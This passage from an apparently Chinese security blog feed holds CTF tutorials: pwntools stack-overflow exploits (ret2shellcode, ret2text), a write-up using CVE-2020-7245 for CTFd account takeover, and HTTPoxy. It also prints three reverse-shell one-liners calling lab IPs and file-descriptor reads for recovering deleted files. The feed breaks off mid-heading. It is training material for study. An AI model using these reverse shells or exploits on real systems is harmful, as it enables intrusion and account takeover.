        <content type="html"><![CDATA[<h3 id="0x-01-Ret2Shellcode原理"><a href="#0x-01-Ret2Shellcode原理" class="headerlink" title="0x 01 Ret2Shellcode原理"></a>0x 01 Ret2Shellcode原理</h3><ul><li><p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell</p></li><li><p>Shellcode获取的两种方式：自己收集和pwntools自带</p></li><li><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p></li><li><p>示意图</p><p>先写入具有攻击性的汇编片段（shellcode）到栈中，然后劫持程序跳转到shellcode的入口处执行</p></li></ul><p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120172248877.png" alt></p><h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><p>main函数伪代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);  &#x2F;&#x2F;setvbuf用于内存优化</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数汇编</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0x0804852d &lt;+0&gt;:push   ebp</span><br><span class="line">0x0804852e &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">0x08048530 &lt;+3&gt;:and    esp,0xfffffff0</span><br><span class="line">0x08048533 &lt;+6&gt;:add    esp,0xffffff80</span><br><span class="line">0x08048536 &lt;+9&gt;:mov    eax,ds:0x804a060</span><br><span class="line">0x0804853b &lt;+14&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048543 &lt;+22&gt;:mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">0x0804854b &lt;+30&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048553 &lt;+38&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048556 &lt;+41&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x0804855b &lt;+46&gt;:mov    eax,ds:0x804a040</span><br><span class="line">0x08048560 &lt;+51&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048568 &lt;+59&gt;:mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">0x08048570 &lt;+67&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048578 &lt;+75&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x0804857b &lt;+78&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x08048580 &lt;+83&gt;:mov    DWORD PTR [esp],0x8048660</span><br><span class="line">0x08048587 &lt;+90&gt;:call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">0x0804858c &lt;+95&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">0x08048590 &lt;+99&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048593 &lt;+102&gt;:call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">0x08048598 &lt;+107&gt;:mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">0x080485a0 &lt;+115&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">0x080485a4 &lt;+119&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">0x080485a8 &lt;+123&gt;:mov    DWORD PTR [esp],0x804a080</span><br><span class="line">0x080485af &lt;+130&gt;:call   0x8048420 &lt;strncpy@plt&gt;</span><br><span class="line">0x080485b4 &lt;+135&gt;:mov    DWORD PTR [esp],0x8048680</span><br><span class="line">0x080485bb &lt;+142&gt;:call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">0x080485c0 &lt;+147&gt;:mov    eax,0x0</span><br><span class="line">0x080485c5 &lt;+152&gt;:leave  </span><br><span class="line">0x080485c6 &lt;+153&gt;:ret</span><br></pre></td></tr></table></figure><p>分析strncpy函数的目录字符串地址是0x804a080，运行readelf -S xxx查看bss段位置</p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180354508.png" style="zoom:67%;"><p>是一个BSS段，如果可以我们讲shellcode放到bss段中，然后将函数的返回值改为0x804a080，现在还缺少一个条件，就是bss段0x804a080是否有执行权限，我们断点调试下：</p><p>执行b main 进行断点</p><p>执行r 运行程序</p><p>执行vmmap查看是否有执行权限</p><p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120180629000.png" alt="image-20200120180629000"></p><p>0x804a080的区间是在标红的0x0804a000到0x0804b000，有x执行权限</p><p>第二步：查找程序溢出的偏移量</p><p>重新执行gdb ./ret2shellcode命令加载程序</p><p>执行pattern create 200创建字符串</p><p>执行 r运行</p><p>输入刚才创建的字符串</p><p><img src="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt="https://s1.51cto.com/images/20190416/1555417473535589.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk="></p><p>得到0x41384141地址，我们使用pattern offset 0x41384141来查看偏移，得到112偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">标准库函数strncpy()，可以将一字符串的一部分拷贝到另一个字符串中。</span><br><span class="line"></span><br><span class="line">strncpy()函数有3个参数：</span><br><span class="line"></span><br><span class="line">1.参数是目录字符串。</span><br><span class="line"></span><br><span class="line">2.参数是源字符串;</span><br><span class="line"></span><br><span class="line">3.参数是一个整数。代表要从源字符串拷贝到目标字符串中的字符数。</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch &#x3D; &#39;i386&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2shellcode&quot;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">payload &#x3D; shellcode.ljust(112,&#39;a&#39;)+p32(0x804a080)   &#x2F;&#x2F;填充偏移量</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">直接覆盖了main函数的返回地址到0x804a080执行shellcode</span><br></pre></td></tr></table></figure><p>参考链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缓冲区溢出-基本ROP-ret2shellcode:</span><br><span class="line">https:&#x2F;&#x2F;blog.51cto.com&#x2F;11797152&#x2F;2379738?source&#x3D;dra</span><br><span class="line">pwntools使用简介2:</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;liuyimin&#x2F;p&#x2F;7379985.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Ret2Shellcode原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2Text原理及应用</title>
      <link href="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-Ret2Text原理"><a href="#0x-01-Ret2Text原理" class="headerlink" title="0x 01 Ret2Text原理"></a>0x 01 Ret2Text原理</h3><ul><li>BSS段通常是指用来存放程序中未初始化的全局变量的一块内存区域。BSS段属于静态内存分配。</li><li>Data通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。</li><li>Text通常是指用来存放程序执行代码的一块内存区域。称为代码段。</li><li>rodata段存放C中的字符串和#define定义的常量</li></ul><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)，使EIP指向具有system(“/bin/sh”)的代码段</p><p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145330415.png" alt></p><h3 id="0x-02-实例分析"><a href="#0x-02-实例分析" class="headerlink" title="0x 02 实例分析"></a>0x 02 实例分析</h3><p>ida查看程序中,存在system函数</p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145534968.png" style="zoom:50%;"><p>main函数伪代码如下：</p><img src="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120145703503.png" style="zoom: 67%;"><p>首先寻找多少字节能溢出切刚好能够覆盖return addr。我们使用gdb-peda提供的pattern_create和pattern_offset。pattern_create是生成一个字符串模板输入后根据EIP来确定覆盖return addr的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_create 200</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;</span><br></pre></td></tr></table></figure><p>然后让程序跑起来输入这串字符串后程序崩溃。根据错误地址计算偏移量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>最终exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;ret2text&quot;)</span><br><span class="line">payload &#x3D; 112 * &#39;a&#39; + p32(0x0804863a)   &#x2F;&#x2F;system函数的入口地址</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Ret2Text原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V&amp;N招新公开赛题解</title>
      <link href="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-HappyCTFd"><a href="#0x-01-HappyCTFd" class="headerlink" title="0x 01 HappyCTFd"></a>0x 01 HappyCTFd</h3><ul><li><p>考点</p><p>CVE-2020-7245</p></li><li><p>解题过程</p></li></ul><ol><li>原理分析：</li></ol><p>注册用户时判断用户是否存在的时候没有对两端空格进行处理，而插入数据库的时候去除了两端的空格。而后在重置密码时，用的又是这个被处理之后的用户名。</p><ol start="2"><li>攻击流程：</li></ol><blockquote><ol><li>利用添加空格绕过限制来注册一个与受害者用户名相同的账号</li><li>生成忘记密码链接发送到自己的邮箱</li><li>将自己的账号的用户名改成与被攻击者不相同的用户名</li><li>用邮箱中收到的链接更改密码即可。</li></ol></blockquote><ol start="3"><li>首先注册一个用户名为 “空格+admin” 的账户。</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174410739.png" alt></p><p>然后用隐私窗口打开，发送密码重置邮件</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174705064.png" alt></p><p>之后修改自己的用户名</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174817943.png" alt></p><p>用邮箱中的链接来重置密码</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174915348.png" alt></p><p>在后台隐藏的题目中找到了flag</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320175042556.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p></blockquote><h3 id="0x-02-CHECKIN"><a href="#0x-02-CHECKIN" class="headerlink" title="0x 02 CHECKIN"></a>0x 02 CHECKIN</h3><ul><li><p>考点</p><p>Linux 基本知识</p></li><li><p>解题过程</p></li></ul><ol><li>页面右键打开查看源代码进行审计</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320180352562.png" alt></p><p>shell路由通过传入参数可以进行命令执行，在每次执行命令前都会把 flag 文件删除且不带回显结果</p><ol start="2"><li>因为是python应用，先反弹一个shell到内网的一个靶机中</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.1.34.205&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">第二种</span><br><span class="line">echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash</span><br><span class="line"></span><br><span class="line">第三种</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320182713990.png" alt></p><p>这里引入文件描述符：</p><p><strong>什么是文件描述符：</strong>内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p><p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p><p><strong>文件描述符储存在什么地方：</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p><p>也就是说，我们可以通过cat进程中的fd来获取到文件描述符。相关知识点在高校运维挑战赛中也考到了。</p><p>利用<code>cat /proc/*/fd/*</code>读取文件缓存找到被移除的flag.txt，得到flag</p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320183213503.png" alt></p><h3 id="0x-03-TimeTravle"><a href="#0x-03-TimeTravle" class="headerlink" title="0x 03 TimeTravle"></a>0x 03 TimeTravle</h3><ul><li><p>考点</p><p>HTTPoxy漏洞（CVE-2016-5385）</p></li><li><p>解题过程</p></li></ul><ol><li>页面打开显示了源代码，进行审计</li></ol><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320195204663.png" alt></p><p>传入参数flag，会请求一个 HTTPAPI 服务，那个服务返回 success 的话就执行程序读 flag。</p><p>传入参数file，就回去读这个文件。</p><p>传入参数phpinfo，就会执行 phpinfo。</p><ol start="2"><li>用返回包中可以知道服务器使用的是Nginx + PHP，查看phpinfo服务器是cgi模式，符合<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a> 所述，我们需要传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。</li><li>尝试进行文件读取<code>/start.sh</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;readflag</span><br><span class="line">chmod +s &#x2F;readflag</span><br><span class="line">echo $FLAG &gt; &#x2F;flag &amp;&amp; export FLAG&#x3D;not_flag &amp;&amp; FLAG&#x3D;not_flag &amp;&amp; cd &#x2F;srv&#x2F;</span><br><span class="line"></span><br><span class="line">chmod 700 &#x2F;flag</span><br><span class="line"></span><br><span class="line">python3 &#x2F;srv&#x2F;app.py &amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php-fpm &amp;</span><br><span class="line"></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line">tail -F &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>开启了<code>php-fpm</code>，<code>http://127.0.0.1:5000/api/eligible</code>服务就是这个<code>/srv/app.py</code>提供的,读取<code>/srv/app.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import datetime</span><br><span class="line">import json</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;api&#x2F;eligible&#39;)</span><br><span class="line">def source():</span><br><span class="line">    current_year &#x3D; int(datetime.datetime.now().strftime(&quot;%Y&quot;))</span><br><span class="line">    if current_year &lt; 2050:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: False&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run(host&#x3D;&#39;127.0.0.1&#39;)</span><br></pre></td></tr></table></figure><ol start="4"><li>方法一：构造一个response返回就可以了，参考一位师傅的payload：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194617008.png" alt></p><p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194548045.png" alt></p><p>方法二：用SimpleHTTPServer模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoHttpServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>, message=<span class="string">'OK'</span>)</span><br><span class="line">        self.send_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;).encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, <span class="number">1234</span>), DemoHttpServer)</span><br><span class="line">    print(<span class="string">'Server is running, user &lt;Ctrl+C&gt; to srop.'</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>方法三：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">header(<span class="string">"Content-Type:application/json"</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($arr);</span><br></pre></td></tr></table></figure><p>当前目录启动<code>php -S 0:2333</code></p><p>参考资料：</p><blockquote><p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p></blockquote><h3 id="0x-04-EasySpringMVC"><a href="#0x-04-EasySpringMVC" class="headerlink" title="0x 04 EasySpringMVC"></a>0x 04 EasySpringMVC</h3><p>待补上</p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p><p><a href="https://blog.csdn.net/chasingin/article/details/104593868" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104593868</a></p><p><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> V&amp;N招新公开赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础知识</title>
      <link href="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-栈帧的概念"><a href="#0x-01-栈帧的概念" class="headerlink" title="0x 01 栈帧的概念"></a>0x 01 栈帧的概念</h3><blockquote><p>从逻辑上讲，栈帧就是一个函数执行的环境：函数调用框架、函数参数、函数的局部变量、函数执行完后返回到哪里等等。栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。</p><p>寄存器ebp指向当前的栈帧的底部（高地址），寄存器esp指向当前的栈帧的顶部（低地址）。</p></blockquote><p><img src="https://images2015.cnblogs.com/blog/1069650/201704/1069650-20170427115241365-545987088.png" alt="img"></p><p>注意：ebp指向当前位于系统栈最上边一个栈帧的底部，而不是系统栈的底部。严格说来，“栈帧底部”和“栈底”是不同的概念;ESP所指的栈帧顶部和系统栈的顶部是同一个位置。**</p><p>参考链接：<a href="https://www.cnblogs.com/33debug/p/6773059.html" target="_blank" rel="noopener">函数的调用过程（栈帧）</a></p><h3 id="0x-02-相关汇编指令"><a href="#0x-02-相关汇编指令" class="headerlink" title="0x 02 相关汇编指令"></a>0x 02 相关汇编指令</h3><p>关于dword ptr 指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">[]里的数据是一个地址值，这个地址指向一个双字型数据</span><br><span class="line">比如mov eax, dword ptr [12345678]  把内存地址12345678中的双字型（32位）数据赋给eax</span><br></pre></td></tr></table></figure><p>关于CALL，RET和LEAVE指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CALL指令的步骤：首先是将返回地址（也就是call指令要执行时EIP的值）压入栈顶，然后是将程序跳转到当前调用的方法的起始地址。执行push和jump指令。</span><br><span class="line"></span><br><span class="line">RET指令则是将栈顶的返回地址弹出到EIP，然后按照EIP此时指示的指令地址继续执行程序。</span><br><span class="line"></span><br><span class="line">LEAVE指令是将栈指针指向帧指针，然后POP备份的原帧指针到%EBP。（恢复到调用的时候ebp和esp值）</span><br><span class="line"></span><br><span class="line">Leave等价于：</span><br><span class="line">movl %ebp %esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure><p>push   ebp //压入返回地址</p><p>lea指令 复制内存地址</p><h3 id="0x-03-相关寄存器"><a href="#0x-03-相关寄存器" class="headerlink" title="0x 03 相关寄存器"></a>0x 03 相关寄存器</h3><p>eip寄存器：用来存储CPU要读取指令的地址,CPU通过<em>EIP寄存器</em>读取即将要执行的指令。</p><h3 id="0x-04-GOT表和PLT表"><a href="#0x-04-GOT表和PLT表" class="headerlink" title="0x 04 GOT表和PLT表"></a>0x 04 